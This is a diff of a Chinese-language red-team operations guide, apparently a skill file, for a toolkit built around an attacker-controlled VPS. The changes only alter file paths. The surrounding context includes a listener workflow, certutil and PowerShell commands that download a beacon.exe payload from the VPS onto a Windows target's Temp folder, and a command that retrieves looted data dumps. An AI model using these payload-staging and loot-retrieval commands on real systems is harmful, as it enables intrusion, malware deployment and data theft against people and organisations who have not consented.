@@ -25,9 +25,9 @@ enabled: true
 ```
 主机    : <你的VPS_IP>（腾讯云，Ubuntu 24.04，2C2G，主机名 <VPS 主机名>）
 用户    : ubuntu（sudo 免密）
-私钥    : $DSH_HOME/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天
+私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天
 可用端口: 9000-9999                                   ← 云安全组只放了这一段
-工具脚本: $DSH_HOME/redteam/toolkit/vps/vps.sh
+工具脚本: ~/.dsh/redteam/toolkit/vps/vps.sh
 ```
 
 **密钥纪律**：私钥只在上面这个路径。任何情况下不要把私钥内容写进技能文件、报告、仓库或对话。
@@ -38,7 +38,7 @@ enabled: true
 ## 快速开始
 
 ```bash
-VPS=$DSH_HOME/redteam/toolkit/vps/vps.sh
+VPS=~/.dsh/redteam/toolkit/vps/vps.sh
 
 $VPS status                 # 看 VPS 状态、剩余端口、现有会话
 $VPS listen                 # 自动挑一个空闲端口开监听（也可 $VPS listen 9000）
@@ -141,7 +141,7 @@ certutil -urlcache -split -f http://<你的VPS_IP>:9100/beacon.exe C:\Windows\Te
 powershell -c "iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
 ```
 
-**取回战利品**：`$VPS get /home/ubuntu/rt/loot/dump.zip $DSH_HOME/redteam/engagements/<靶标>/runs/`
+**取回战利品**：`$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<靶标>/runs/`
 
 ## 反向隧道与中转
 
